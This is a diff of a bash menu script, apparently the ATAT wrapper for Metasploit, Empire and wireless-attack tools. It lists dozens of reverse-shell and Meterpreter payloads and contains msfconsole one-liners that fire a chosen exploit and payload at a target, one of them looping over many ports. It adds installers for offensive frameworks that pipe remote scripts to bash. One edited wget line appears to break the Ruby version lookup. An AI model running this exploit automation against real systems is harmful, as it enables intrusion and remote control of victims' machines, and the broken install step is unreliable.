@@ -171,7 +171,7 @@ fi
 tput sgr0                                       # 
 echo -e "\e[31m_________________________[ \e[97mChoose Your Destiny \e[31m]________________________"
 echo -e "\E[1;34m::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
-echo -e "\E[1;34m===\e[97m[1] \e[90mPayload              \e[97m [Create MSFVenom Payload]  \E[1;34m"
+echo -e "\E[1;34m===\e[97m[1] \e[36mPayload              \e[97m [Create MSFVenom Payload]  \E[1;34m"
 tput sgr0                               # Reset colors to "normal."
 echo -e "\E[1;34m:::\e[97m[2] \e[32mListen               \e[97m [Start a Listener]   \E[1;34m"
 tput sgr0
@@ -181,7 +181,7 @@ echo -e "\E[1;34m:::\e[97m[4] \e[95mPersistence          \e[97m [Create a Persis
 tput sgr0
 echo -e "\E[1;34m===\e[97m[5] \e[31mArmitage             \e[97m [Launch the Armitage GUI]  \E[1;34m"
 tput sgr0
-echo -e "\E[1;34m:::\e[97m[6] \e[90mMulti-Target Exploit \e[97m [Breach Defenses With Thermal Detonators]   \E[1;34m"
+echo -e "\E[1;34m:::\e[97m[6] \e[36mMulti-Target Exploit \e[97m [Breach Defenses With Thermal Detonators]   \E[1;34m"
 tput sgr0                               # Reset attributes.
 echo -e "\E[1;34m===\e[97m[7] \e[32mAuxiliary & Scanning \e[97m [Run Aux Mods & Scans On Many Targets/Ports]  \E[1;34m"
 tput sgr0
@@ -191,7 +191,7 @@ echo -e "\E[1;34m===\e[97m[9] \e[95mEmpire & DeathStar  \e[97m  [Pledge Your All
 tput sgr0
 echo -e "\E[1;34m:::\e[97m[10]\e[31mWireless Attacks      \e[97m[Rule The Airwaves]   \E[1;34m"
 tput sgr0
-echo -e "\E[1;34m===\e[97m[11]\e[90mPost Exploitation     \e[97m[Loot & Profit]   \E[1;34m"
+echo -e "\E[1;34m===\e[97m[11]\e[36mPost Exploitation     \e[97m[Loot & Profit]   \E[1;34m"
 tput sgr0
 echo -e "\E[1;34m:::\e[97m[12]\e[32mMake Your Escape     \e[97m [Float Away...With The Rest Of The Garbage]   \E[1;34m"
 tput sgr0
@@ -199,9 +199,11 @@ echo -e "\E[1;34m===\e[97m[13]\e[34mPrivilege Escalation  \e[97m[PrivEsc Options
 tput sgr0
 echo -e "\E[1;34m:::\e[97m[14]\e[95mImperial Research Lab \e[97m[Proof Of Concept Techniques]   \E[1;34m"
 tput sgr0
-echo -e "\E[1;34m===\e[97m[00]\e[31mReset & Recharge      \e[97m[Wipe All Scan Output To Lock A New Target]  \E[1;34m"
+echo -e "\E[1;34m===\e[97m[15]\e[31mEmpire & Starkiller  \e[97m [Pledge Your Allegiance to The BC Empire]   \E[1;34m"
 tput sgr0
-echo -e "\E[1;34m:::\e[97m[0] \e[90mExit                  \e[97m[Exit ATAT]   \E[1;34m"
+echo -e "\E[1;34m:::\e[97m[00]\e[36mReset & Recharge      \e[97m[Wipe All Scan Output To Lock A New Target]  \E[1;34m"
+tput sgr0
+echo -e "\E[1;34m===\e[97m[0] \e[32mExit                  \e[97m[Exit ATAT]   \E[1;34m"
 tput sgr0
 
 echo -e "\E[1;34m::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
@@ -280,7 +282,7 @@ EOF
             ~/ATAT/ATAT.sh
             ;;
         "Quit")
-            echo "Aufiederszehn" && exit 1
+            echo "auf Wiedersehen" && exit 1
             ;;
         *) echo invalid option;;
     esac
@@ -290,77 +292,77 @@ done
   "2" | "2" )
 cat << "EOF"
 Common Payload Types:
-payload/android/meterpreter/reverse_http    Android Meterpreter, Android Reverse HTTP Stager
-payload/android/meterpreter/reverse_https   Android Meterpreter, Android Reverse HTTPS Stager
-payload/android/meterpreter/reverse_tcp     Android Meterpreter, Android Reverse TCP Stager
-payload/android/meterpreter_reverse_http    Android Meterpreter Shell, Reverse HTTP Inline
-payload/android/meterpreter_reverse_https   Android Meterpreter Shell, Reverse HTTPS Inline
-payload/android/meterpreter_reverse_tcp     Android Meterpreter Shell, Reverse TCP Inline
-payload/android/shell/reverse_http          Command Shell, Android Reverse HTTP Stager
-payload/android/shell/reverse_https         Command Shell, Android Reverse HTTPS Stager
-payload/android/shell/reverse_tcp           Command Shell, Android Reverse TCP Stager
-payload/java/jsp_shell_reverse_tcp          Java JSP Command Shell, Reverse TCP Inline
-payload/java/meterpreter/reverse_http       Java Meterpreter, Java Reverse HTTP Stager
-payload/java/meterpreter/reverse_https      Java Meterpreter, Java Reverse HTTPS Stager
-payload/java/meterpreter/reverse_tcp        Java Meterpreter, Java Reverse TCP Stager
-payload/java/shell/reverse_tcp              Command Shell, Java Reverse TCP Stager
-payload/java/shell_reverse_tcp              Java Command Shell, Reverse TCP Inline
-payload/linux/x64/meterpreter/reverse_tcp   Linux Mettle x64, Reverse TCP Stager
-payload/linux/x64/meterpreter_reverse_http  Linux Meterpreter, Reverse HTTP Inline
-payload/linux/x64/meterpreter_reverse_https Linux Meterpreter, Reverse HTTPS Inline
-payload/linux/x64/meterpreter_reverse_tcp   Linux Meterpreter, Reverse TCP Inline
-payload/linux/x86/meterpreter/reverse_tcp   Linux Mettle x86, Reverse TCP Stager
-payload/linux/x86/meterpreter_reverse_http  Linux Meterpreter, Reverse HTTP Inline
-payload/linux/x86/meterpreter_reverse_https Linux Meterpreter, Reverse HTTPS Inline
-payload/linux/x86/meterpreter_reverse_tcp   Linux Meterpreter, Reverse TCP Inline
-payload/linux/x86/shell/reverse_tcp         Linux Command Shell, Reverse TCP Stager
-payload/linux/x86/shell_reverse_tcp         Linux Command Shell, Reverse TCP Inline
-payload/multi/meterpreter/reverse_http      Arch-Independent Meterpreter Stage, Reverse HTTP Stager (Mulitple Architectures)
-payload/multi/meterpreter/reverse_https     Arch-Independent Meterpreter Stage, Reverse HTTPS Stager (Mulitple Architectures)
-payload/osx/x64/meterpreter/reverse_tcp     OSX Meterpreter, Reverse TCP Stager
-payload/osx/x64/meterpreter_reverse_http    OSX Meterpreter, Reverse HTTP Inline
-payload/osx/x64/meterpreter_reverse_https   OSX Meterpreter, Reverse HTTPS Inline
-payload/osx/x64/meterpreter_reverse_tcp     OSX Meterpreter, Reverse TCP Inline
-payload/osx/x64/shell_reverse_tcp           OS X x64 Shell Reverse TCP
-payload/osx/x86/bundleinject/reverse_tcp    Mac OS X Inject Mach-O Bundle, Reverse TCP Stager
-payload/osx/x86/shell_reverse_tcp           OS X Command Shell, Reverse TCP Inline
-payload/php/meterpreter/reverse_tcp         PHP Meterpreter, PHP Reverse TCP Stager
-payload/php/meterpreter_reverse_tcp         PHP Meterpreter, Reverse TCP Inline
-payload/python/meterpreter/reverse_http     Python Meterpreter, Python Reverse HTTP Stager
-payload/python/meterpreter/reverse_https    Python Meterpreter, Python Reverse HTTPS Stager
-payload/python/meterpreter/reverse_tcp      Python Meterpreter, Python Reverse TCP Stager
-payload/python/meterpreter/reverse_tcp_ssl  Python Meterpreter, Python Reverse TCP SSL Stager
-payload/python/meterpreter_reverse_http     Python Meterpreter Shell, Reverse HTTP Inline
-payload/python/meterpreter_reverse_https    Python Meterpreter Shell, Reverse HTTPS Inline
-payload/python/meterpreter_reverse_tcp      Python Meterpreter Shell, Reverse TCP Inline
-payload/python/shell_reverse_tcp            Command Shell, Reverse TCP (via python)
-payload/python/shell_reverse_tcp_ssl        Command Shell, Reverse TCP SSL (via python)
-payload/python/shell_reverse_udp            Command Shell, Reverse UDP (via python)
-payload/cmd/windows/powershell_reverse_tcp  Windows Interactive Powershell Session, Reverse TCP
-payload/cmd/windows/reverse_lua             Windows Command Shell, Reverse TCP (via Lua)
-payload/cmd/windows/reverse_perl            Windows Command, Double Reverse TCP Connection (via Perl)
-payload/cmd/windows/reverse_powershell      Windows Command Shell, Reverse TCP (via Powershell)
-payload/cmd/windows/reverse_ruby            Windows Command Shell, Reverse TCP (via Ruby)
-payload/windows/dllinject/reverse_tcp       Reflective DLL Injection, Reverse TCP Stager
-payload/windows/meterpreter/reverse_http    Windows Meterpreter (Reflective Injection), Windows Reverse HTTP Stager (wininet)
-payload/windows/meterpreter/reverse_https   Windows Meterpreter (Reflective Injection), Windows Reverse HTTPS Stager (wininet)
-payload/windows/meterpreter/reverse_tcp     Windows Meterpreter (Reflective Injection), Reverse TCP Stager
-payload/windows/meterpreter_reverse_http    Windows Meterpreter Shell, Reverse HTTP Inline
-payload/windows/meterpreter_reverse_https   Windows Meterpreter Shell, Reverse HTTPS Inline
-payload/windows/meterpreter_reverse_tcp     Windows Meterpreter Shell, Reverse TCP Inline
-payload/windows/powershell_reverse_tcp      Windows Interactive Powershell Session, Reverse TCP
-payload/windows/shell/reverse_tcp           Windows Command Shell, Reverse TCP Stager
-payload/windows/shell_reverse_tcp           Windows Command Shell, Reverse TCP Inline
-payload/windows/x64/meterpreter/reverse_https    Windows Meterpreter (Reflective Injection x64), Reverse HTTP Stager (wininet)
-payload/windows/x64/meterpreter/reverse_tcp      Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager
-payload/windows/x64/meterpreter/reverse_winhttp  Windows Meterpreter (Reflective Injection x64), Reverse HTTP Stager (winhttp)
-payload/windows/x64/meterpreter/reverse_winhttps Windows Meterpreter (Reflective Injection x64) Reverse HTTPS Stager (winhttp)
-payload/windows/x64/meterpreter_reverse_http     Windows Meterpreter Shell, Reverse HTTP Inline (x64)
-payload/windows/x64/meterpreter_reverse_https    Windows Meterpreter Shell, Reverse HTTPS Inline (x64)
-payload/windows/x64/meterpreter_reverse_tcp      Windows Meterpreter Shell, Reverse TCP Inline x64
-payload/windows/x64/powershell_reverse_tcp       Windows Interactive Powershell Session, Reverse TCP
-payload/windows/x64/shell/reverse_tcp       Windows x64 Command Shell, Windows x64 Reverse TCP Stager
-payload/windows/x64/shell_reverse_tcp       Windows x64 Command Shell, Reverse TCP Inline
+android/meterpreter/reverse_http    Android Meterpreter, Android Reverse HTTP Stager
+android/meterpreter/reverse_https   Android Meterpreter, Android Reverse HTTPS Stager
+android/meterpreter/reverse_tcp     Android Meterpreter, Android Reverse TCP Stager
+android/meterpreter_reverse_http    Android Meterpreter Shell, Reverse HTTP Inline
+android/meterpreter_reverse_https   Android Meterpreter Shell, Reverse HTTPS Inline
+android/meterpreter_reverse_tcp     Android Meterpreter Shell, Reverse TCP Inline
+android/shell/reverse_http          Command Shell, Android Reverse HTTP Stager
+android/shell/reverse_https         Command Shell, Android Reverse HTTPS Stager
+android/shell/reverse_tcp           Command Shell, Android Reverse TCP Stager
+java/jsp_shell_reverse_tcp          Java JSP Command Shell, Reverse TCP Inline
+java/meterpreter/reverse_http       Java Meterpreter, Java Reverse HTTP Stager
+java/meterpreter/reverse_https      Java Meterpreter, Java Reverse HTTPS Stager
+java/meterpreter/reverse_tcp        Java Meterpreter, Java Reverse TCP Stager
+java/shell/reverse_tcp              Command Shell, Java Reverse TCP Stager
+java/shell_reverse_tcp              Java Command Shell, Reverse TCP Inline
+linux/x64/meterpreter/reverse_tcp   Linux Mettle x64, Reverse TCP Stager
+linux/x64/meterpreter_reverse_http  Linux Meterpreter, Reverse HTTP Inline
+linux/x64/meterpreter_reverse_https Linux Meterpreter, Reverse HTTPS Inline
+linux/x64/meterpreter_reverse_tcp   Linux Meterpreter, Reverse TCP Inline
+linux/x86/meterpreter/reverse_tcp   Linux Mettle x86, Reverse TCP Stager
+linux/x86/meterpreter_reverse_http  Linux Meterpreter, Reverse HTTP Inline
+linux/x86/meterpreter_reverse_https Linux Meterpreter, Reverse HTTPS Inline
+linux/x86/meterpreter_reverse_tcp   Linux Meterpreter, Reverse TCP Inline
+linux/x86/shell/reverse_tcp         Linux Command Shell, Reverse TCP Stager
+linux/x86/shell_reverse_tcp         Linux Command Shell, Reverse TCP Inline
+multi/meterpreter/reverse_http      Arch-Independent Meterpreter Stage, Reverse HTTP Stager (Mulitple Architectures)
+multi/meterpreter/reverse_https     Arch-Independent Meterpreter Stage, Reverse HTTPS Stager (Mulitple Architectures)
+osx/x64/meterpreter/reverse_tcp     OSX Meterpreter, Reverse TCP Stager
+osx/x64/meterpreter_reverse_http    OSX Meterpreter, Reverse HTTP Inline
+osx/x64/meterpreter_reverse_https   OSX Meterpreter, Reverse HTTPS Inline
+osx/x64/meterpreter_reverse_tcp     OSX Meterpreter, Reverse TCP Inline
+osx/x64/shell_reverse_tcp           OS X x64 Shell Reverse TCP
+osx/x86/bundleinject/reverse_tcp    Mac OS X Inject Mach-O Bundle, Reverse TCP Stager
+osx/x86/shell_reverse_tcp           OS X Command Shell, Reverse TCP Inline
+php/meterpreter/reverse_tcp         PHP Meterpreter, PHP Reverse TCP Stager
+php/meterpreter_reverse_tcp         PHP Meterpreter, Reverse TCP Inline
+python/meterpreter/reverse_http     Python Meterpreter, Python Reverse HTTP Stager
+python/meterpreter/reverse_https    Python Meterpreter, Python Reverse HTTPS Stager
+python/meterpreter/reverse_tcp      Python Meterpreter, Python Reverse TCP Stager
+python/meterpreter/reverse_tcp_ssl  Python Meterpreter, Python Reverse TCP SSL Stager
+python/meterpreter_reverse_http     Python Meterpreter Shell, Reverse HTTP Inline
+python/meterpreter_reverse_https    Python Meterpreter Shell, Reverse HTTPS Inline
+python/meterpreter_reverse_tcp      Python Meterpreter Shell, Reverse TCP Inline
+python/shell_reverse_tcp            Command Shell, Reverse TCP (via python)
+python/shell_reverse_tcp_ssl        Command Shell, Reverse TCP SSL (via python)
+python/shell_reverse_udp            Command Shell, Reverse UDP (via python)
+cmd/windows/powershell_reverse_tcp  Windows Interactive Powershell Session, Reverse TCP
+cmd/windows/reverse_lua             Windows Command Shell, Reverse TCP (via Lua)
+cmd/windows/reverse_perl            Windows Command, Double Reverse TCP Connection (via Perl)
+cmd/windows/reverse_powershell      Windows Command Shell, Reverse TCP (via Powershell)
+cmd/windows/reverse_ruby            Windows Command Shell, Reverse TCP (via Ruby)
+windows/dllinject/reverse_tcp       Reflective DLL Injection, Reverse TCP Stager
+windows/meterpreter/reverse_http    Windows Meterpreter (Reflective Injection), Windows Reverse HTTP Stager (wininet)
+windows/meterpreter/reverse_https   Windows Meterpreter (Reflective Injection), Windows Reverse HTTPS Stager (wininet)
+windows/meterpreter/reverse_tcp     Windows Meterpreter (Reflective Injection), Reverse TCP Stager
+windows/meterpreter_reverse_http    Windows Meterpreter Shell, Reverse HTTP Inline
+windows/meterpreter_reverse_https   Windows Meterpreter Shell, Reverse HTTPS Inline
+windows/meterpreter_reverse_tcp     Windows Meterpreter Shell, Reverse TCP Inline
+windows/powershell_reverse_tcp      Windows Interactive Powershell Session, Reverse TCP
+windows/shell/reverse_tcp           Windows Command Shell, Reverse TCP Stager
+windows/shell_reverse_tcp           Windows Command Shell, Reverse TCP Inline
+windows/x64/meterpreter/reverse_https    Windows Meterpreter (Reflective Injection x64), Reverse HTTP Stager (wininet)
+windows/x64/meterpreter/reverse_tcp      Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager
+windows/x64/meterpreter/reverse_winhttp  Windows Meterpreter (Reflective Injection x64), Reverse HTTP Stager (winhttp)
+windows/x64/meterpreter/reverse_winhttps Windows Meterpreter (Reflective Injection x64) Reverse HTTPS Stager (winhttp)
+windows/x64/meterpreter_reverse_http     Windows Meterpreter Shell, Reverse HTTP Inline (x64)
+windows/x64/meterpreter_reverse_https    Windows Meterpreter Shell, Reverse HTTPS Inline (x64)
+windows/x64/meterpreter_reverse_tcp      Windows Meterpreter Shell, Reverse TCP Inline x64
+windows/x64/powershell_reverse_tcp       Windows Interactive Powershell Session, Reverse TCP
+windows/x64/shell/reverse_tcp       Windows x64 Command Shell, Windows x64 Reverse TCP Stager
+windows/x64/shell_reverse_tcp       Windows x64 Command Shell, Reverse TCP Inline
 EOF
 echo -e "\E[1;34m::::: \e[97mCreate a Listener \E[1;34m:::::"
 echo -e "\E[1;34m::::: \e[97mCommon Payload Types Listed Above For Reference \E[1;34m:::::"
@@ -437,7 +439,7 @@ do
             ~/ATAT/ATAT.sh
             ;;
         "Quit")
-            echo "Aufiederszehn" && exit 1
+            echo "auf Wiedersehen" && exit 1
             ;;
         *) echo invalid option;;
     esac
@@ -940,7 +942,7 @@ EOF
             ~/ATAT/ATAT.sh
             ;;
         "Quit")
-            echo "Aufiederszehn" && exit 1
+            echo "auf Wiedersehen" && exit 1
             ;;
         *) echo invalid option;;
     esac
@@ -974,7 +976,7 @@ do
 	msfconsole -q -x "use $userexploit;\
 	set LHOST $userhost;\
 	set LPORT $userport;\
-	set RHOST $IP;\
+	set RHOSTS $IP;\
 	set RPORT $targetport;\
 	set PAYLOAD $userpayload;\
 	set DisablePayloadHandler true;\
@@ -987,7 +989,7 @@ do
     "Mulit-Port")
     echo -e "\E[1;34m::::: \e[97mExploit All The Ports!! \E[1;34m:::::"
     echo -e "\E[1;34m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!! \E[1;34m:::::"
-            read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set EXPLOIT_PATH: ' userexploit; read -p 'Set PAYLOAD: ' userpayload; read -p 'Set RHOST: ' usertarget;
+            read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set EXPLOIT_PATH: ' userexploit; read -p 'Set PAYLOAD: ' userpayload; read -p 'Set RHOSTS: ' usertarget;
 	inputfile=~/ATAT/MSF_target_ports.txt
 
 	for PORT in $(cat $inputfile)
@@ -995,7 +997,7 @@ do
 	msfconsole -q -x "use $userexploit;\
 	set LHOST $userhost;\
 	set LPORT $userport;\
-	set RHOST $usertarget;\
+	set RHOSTS $usertarget;\
 	set RPORT $PORT;\
 	set PAYLOAD $userpayload;\
 	set DisablePayloadHandler true;\
@@ -1017,7 +1019,7 @@ do
 	set LPORT $userport;\
 	set SRVPORT $srvport;\
 	set RPORT $targetport;\
-	set RHOST $IP;\
+	set RHOSTS $IP;\
 	set PAYLOAD $userpayload;\
 	set TARGETURI $useruri;\
 	set DisablePayloadHandler true;\
@@ -1039,7 +1041,7 @@ do
 	set LPORT $userport;\
 	set SRVPORT $srvport;\
 	set RPORT $targetport;\
-	set RHOST $IP;\
+	set RHOSTS $IP;\
 	set PAYLOAD $userpayload;\
 	set HttpPassword $userpassword;\
 	set HttpUsername $userusername;\
@@ -1062,7 +1064,7 @@ do
 	set LPORT $userport;\
 	set SRVPORT $srvport;\
 	set RPORT $targetport;\
-	set RHOST $IP;\
+	set RHOSTS $IP;\
 	set PAYLOAD $userpayload;\
 	set JMXRMI $userjmxrmi;\
 	set DisablePayloadHandler true;\
@@ -1084,7 +1086,7 @@ do
 	set LPORT $userport;\
 	set SRVPORT $srvport;\
 	set RPORT $targetport;\
-	set RHOST $IP;\
+	set RHOSTS $IP;\
 	set PAYLOAD $userpayload;\
 	set HTTPDELAY $userdelay;\
 	set DisablePayloadHandler true;\
@@ -1146,7 +1148,7 @@ EOF
             ~/ATAT/ATAT.sh
             ;;
         "Quit")
-            echo "Aufiederszehn" && exit 1
+            echo "auf Wiedersehen" && exit 1
             ;;
         *) echo invalid option;;
     esac
@@ -1319,7 +1321,7 @@ select opt in "${options[@]}"
             ~/ATAT/ATAT.sh
             ;;
         "Quit")
-            echo "Aufiederszehn" && exit 1
+            echo "auf Wiedersehen" && exit 1
             ;;
         *) echo invalid option;;
 		esac
@@ -1374,7 +1376,7 @@ select opt in "${options[@]}"
             ~/ATAT/ATAT.sh
             ;;
     "Quit")
-            echo "Aufiederszehn" && exit 1
+            echo "auf Wiedersehen" && exit 1
             ;;
         *) echo invalid option;;
     esac
@@ -1386,9 +1388,10 @@ done
   # Accept upper or lowercase input.
   echo -e "\E[1;34m::::: \e[97mCheck for Dependencies \E[1;34m:::::"
   echo -e "\E[1;34m::::: \e[97mPowershell Empire & DeathStar Option Should Only Be Run If You Are Logged In As root!! \E[1;34m:::::"
+  echo -e "\E[1;34m::::: \e[97mONLY INSTALL ONE Powershell Empire. BC-SECURITY Is The Maintained Version. Only Use The Legacy PSE If You Know What You Are Doing! \E[1;34m:::::"
 
-PS3='Enter your choice: ENTER=Options Menu | 14=Main Menu | 15=QUIT: '
-options=("Powershell Empire & DeathStar" "Dependencies" "DBD Installer" "Airgeddon Install Workaround" "WiFi Jammer Install" "changeme Install" "Apt Update Fix" "Pupy Install" "BeRoot Install" "GhostPack Install" "Hashcat Install" "Wifiphisher Install" "Non-Security Debian Distros-BETA" "Main Menu" "Quit") #"HostAPD-WPE via Github" "Kernelpop Install"
+PS3='Enter your choice: ENTER=Options Menu | 15=Main Menu | 16=QUIT: '
+options=("Powershell Empire & DeathStar" "BC-SECURITY Powershell Empire & Starkiller" "Dependencies" "DBD Installer" "Airgeddon Install Workaround" "WiFi Jammer Install" "changeme Install" "Apt Update Fix" "Pupy Install" "BeRoot Install" "GhostPack Install" "Hashcat Install" "Wifiphisher Install" "Non-Security Debian Distros-BETA" "Main Menu" "Quit") #"HostAPD-WPE via Github" "Kernelpop Install"
 select opt in "${options[@]}"
 do
     case $opt in
@@ -1400,6 +1403,19 @@ do
 		cd ..
 		echo -e "\e[1;34m[*] Install Of Powershell Empire & DeathStar Complete\e[0m\n"
 		echo -e "\e[1;34m[*] If You Get Errors About \"building cryptography\", then manually run /root/Empire/setup/install.sh & then /root/Empire/setup/reset.sh \e[0m\n"
+			;;
+		"BC-SECURITY Powershell Empire & Starkiller")
+		git clone https://github.com/BC-SECURITY/Empire ~/Empire
+		cd ~/Empire/setup && chmod +x install.sh && ./install.sh && cd .. && chmod +x empire && cd ..
+		# Yarn install
+		curl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | sudo apt-key add - && echo "deb https://dl.yarnpkg.com/debian/ stable main" | sudo tee /etc/apt/sources.list.d/yarn.list && sudo apt update && sudo apt install yarn && export PATH="$PATH:/opt/yarn-*/bin" && yarn install
+		# Nodejs install
+		curl -sL https://deb.nodesource.com/setup_12.x | bash - && apt-get install -y nodejs
+		# Starkiller install
+		wget https://github.com/BC-SECURITY/Starkiller/releases/download/v1.2.2/starkiller-1.2.2.AppImage -O /root/starkiller-1.2.2.AppImage
+		chmod +x /root/starkiller-1.2.2.AppImage
+		echo -e "\e[1;34m[*] Install Of Powershell Empire & Starkiller Complete\e[0m\n"
+		echo -e "\e[1;34m[*] If You Get Errors, then manually run /root/Empire/setup/install.sh & then /root/Empire/setup/reset.sh \e[0m\n"
 			;;
         "Dependencies")
 		clear
@@ -1417,7 +1433,7 @@ do
 		mkdir /tmp/ATAT/
 		echo ""
 
-	reqs="gcc gcc-mingw-w64-i686 curl jq bettercap macchanger apache2 lbd masscan msfpc sslscan libssl-dev libnl-genl-3-dev hostapd-wpe lynx airgeddon hostapd lighttpd asleap python-pip python-scapy gawk libatk-adaptor libgail-common bloodhound libxml2-dev libxslt1-dev unixodbc-dev git libssl1.0-dev libffi-dev python-dev tcpdump python-virtualenv p7zip"
+	reqs="gcc gcc-mingw-w64-i686 curl jq bettercap macchanger apache2 lbd masscan msfpc sslscan libssl-dev libnl-genl-3-dev hostapd-wpe lynx airgeddon hostapd lighttpd asleap python-pip python-scapy gawk libatk-adaptor libgail-common bloodhound libxml2-dev libxslt1-dev unixodbc-dev git libssl1.0-dev libffi-dev python-dev tcpdump python-virtualenv p7zip zlib1g-dev libpam0g-dev libcurl4-openssl-dev"
 	for i in $reqs; do
 		dpkg -s "$i" &> /tmp/ATAT/$i-install.txt
 		isinstalled=$(cat /tmp/ATAT/$i-install.txt | grep -o "Status: install ok installed")
@@ -1456,7 +1472,7 @@ do
 			echo -e "\n\e[1;34m[*] I see that DBD is already installed...\e[0m"
 			echo ""
 			sleep 3
-			echo "Aufiederszehn" && ~/ATAT/ATAT.sh
+			echo "auf Wiedersehen" && ~/ATAT/ATAT.sh
 		else
 			echo -e "\e[1;34m[*] Performing DBD install...\e[0m\n"
 			clear
@@ -1651,29 +1667,29 @@ reqs="gcc gcc-mingw-w64-i686 libnl-dev xterm openjdk-8-jdk aircrack-ng ethtool i
 						sleep 2
 				fi
 			fi
-	#echo -e "\E[1;34m::::: \e[97mInstalling Metasploit-Framework Dependencies... \E[1;34m:::::"
-	#add-apt-repository -y ppa:webupd8team/java
-	#apt update
-	#apt -y install oracle-java8-installer
-	#apt-get -y install build-essential libreadline-dev libssl-dev libpq5 libpq-dev libreadline5 libsqlite3-dev libpcap-dev git-core autoconf postgresql pgadmin3 curl zlib1g-dev libxml2-dev libxslt1-dev libyaml-dev curl zlib1g-dev gawk bison libffi-dev libgdbm-dev libncurses5-dev libtool sqlite3 libgmp-dev gnupg2 dirmngr
-	#cd ~
-	#git clone git://github.com/sstephenson/rbenv.git .rbenv
-	#echo \'export PATH=\"$HOME/.rbenv/bin:$PATH\"\' >> ~/.bashrc
-	#echo \'eval \"$(rbenv init -)\"\' >> ~/.bashrc
-	#exec $SHELL
+	echo -e "\E[1;34m::::: \e[97mInstalling Metasploit-Framework Dependencies... \E[1;34m:::::"
+	add-apt-repository -y ppa:webupd8team/java
+	apt update
+	apt -y install oracle-java8-installer
+	apt-get -y install build-essential libreadline-dev libssl-dev libpq5 libpq-dev libreadline5 libsqlite3-dev libpcap-dev git-core autoconf postgresql pgadmin3 curl zlib1g-dev libxml2-dev libxslt1-dev libyaml-dev curl zlib1g-dev gawk bison libffi-dev libgdbm-dev libncurses5-dev libtool sqlite3 libgmp-dev gnupg2 dirmngr
+	cd ~
+	git clone git://github.com/sstephenson/rbenv.git .rbenv
+	echo \'export PATH=\"$HOME/.rbenv/bin:$PATH\"\' >> ~/.bashrc
+	echo \'eval \"$(rbenv init -)\"\' >> ~/.bashrc
+	exec $SHELL
 	
-	#git clone git://github.com/sstephenson/ruby-build.git ~/.rbenv/plugins/ruby-build
-	#echo \'export PATH=\"$HOME/.rbenv/plugins/ruby-build/bin:$PATH\"\' >> ~/.bashrc
+	git clone git://github.com/sstephenson/ruby-build.git ~/.rbenv/plugins/ruby-build
+	echo \'export PATH=\"$HOME/.rbenv/plugins/ruby-build/bin:$PATH\"\' >> ~/.bashrc
 	
-	## sudo plugin so we can run Metasploit as root with "rbenv sudo msfconsole" 
-	#git clone git://github.com/dcarley/rbenv-sudo.git ~/.rbenv/plugins/rbenv-sudo
+	# sudo plugin so we can run Metasploit as root with "rbenv sudo msfconsole" 
+	git clone git://github.com/dcarley/rbenv-sudo.git ~/.rbenv/plugins/rbenv-sudo
 	
-	#exec $SHELL
+	exec $SHELL
 	
-	#RUBYVERSION=$(wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/.ruby-version -q -O - )
-	#rbenv install $RUBYVERSION
-	#rbenv global $RUBYVERSION
-	#ruby -v
+	RUBYVERSION=$(wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/.ruby-version)
+	rbenv install $RUBYVERSION
+	rbenv global $RUBYVERSION
+	ruby -v
 	
 	echo -e "\E[1;34m::::: \e[97mInstalling Nmap... \E[1;34m:::::"
 
@@ -1686,42 +1702,43 @@ reqs="gcc gcc-mingw-w64-i686 libnl-dev xterm openjdk-8-jdk aircrack-ng ethtool i
 	sudo make install
 	make clean
 	
-	#echo -e "\E[1;34m::::: \e[97mInstalling Metasploit-Framework... \E[1;34m:::::"
+	echo -e "\E[1;34m::::: \e[97mInstalling Metasploit-Framework... \E[1;34m:::::"
 
-	#cd /opt
-	#git clone https://github.com/rapid7/metasploit-framework.git
-	#chown -R `whoami` /opt/metasploit-framework
-	#cd metasploit-framework
+	cd /opt
+	git clone https://github.com/rapid7/metasploit-framework.git
+	chown -R `whoami` /opt/metasploit-framework
+	cd /opt/metasploit-framework
 	
 ##	cd metasploit-framework
-	#gem install bundler
-	#bundle install
+	gem install bundler
+	bundle install
 	
 ##	cd metasploit-framework
-    #bash -c 'for MSF in $(ls msf*); do ln -s /opt/metasploit-framework/$MSF /usr/local/bin/$MSF;done'
+    bash -c 'for MSF in $(ls msf*); do ln -s /opt/metasploit-framework/$MSF /usr/local/bin/$MSF;done'
     
-	#echo "export PATH=$PATH:/usr/lib/postgresql/10/bin" >> ~/.bashrc
-	#. ~/.bashrc     
-	
-	#usermod -a -G postgres `whoami`
-    #su - `whoami`
+	echo "export PATH=$PATH:/usr/lib/postgresql/10/bin" >> ~/.bashrc
+	echo "export PATH=$PATH:/usr/lib/postgresql/9.5/bin" >> ~/.bashrc
+	echo "export PATH=$PATH:/usr/lib/postgresql/11/bin" >> ~/.bashrc
+	. ~/.bashrc     
+	usermod -a -G postgres `whoami`
+    su - `whoami`
     
-    #echo -e "\E[1;34m::::: \e[97mWe now navigate to the Metasploit folder and initialize the database and REST API.  When you run the msfdb follow the instructions on the screen. \E[1;34m:::::"
+    echo -e "\E[1;34m::::: \e[97mWe now navigate to the Metasploit folder and initialize the database and REST API.  When you run the msfdb follow the instructions on the screen. \E[1;34m:::::"
     
-    #cd /opt/metasploit-framework/
-	#./msfdb init
+    cd /opt/metasploit-framework/
+	./msfdb init
 	
-#<< "EOF"
-#If the service will be exposed to any network other than local do generate proper SSL keys for use of it in operations. For more information check Rapid7 documentation https://github.com/rapid7/metasploit-framework/wiki/Metasploit-Web-Service
-#EOF
-	#sleep 10
-	#echo ""
-#<< "EOF"
-#Now we are ready to run Metasploit for the first time. ATAT will run it first under the root user so the folders create under the root home directory with the proper permissions. The first time it runs it will create the entries needed by Metasploit in the database so it will take a while to load.
-#EOF
-	#xterm -e msfconsole &
+<< "EOF"
+If the service will be exposed to any network other than local do generate proper SSL keys for use of it in operations. For more information check Rapid7 documentation https://github.com/rapid7/metasploit-framework/wiki/Metasploit-Web-Service
+EOF
+	sleep 10
+	echo ""
+<< "EOF"
+Now we are ready to run Metasploit for the first time. ATAT will run it first under the root user so the folders create under the root home directory with the proper permissions. The first time it runs it will create the entries needed by Metasploit in the database so it will take a while to load.
+EOF
+	xterm -e msfconsole &
 	
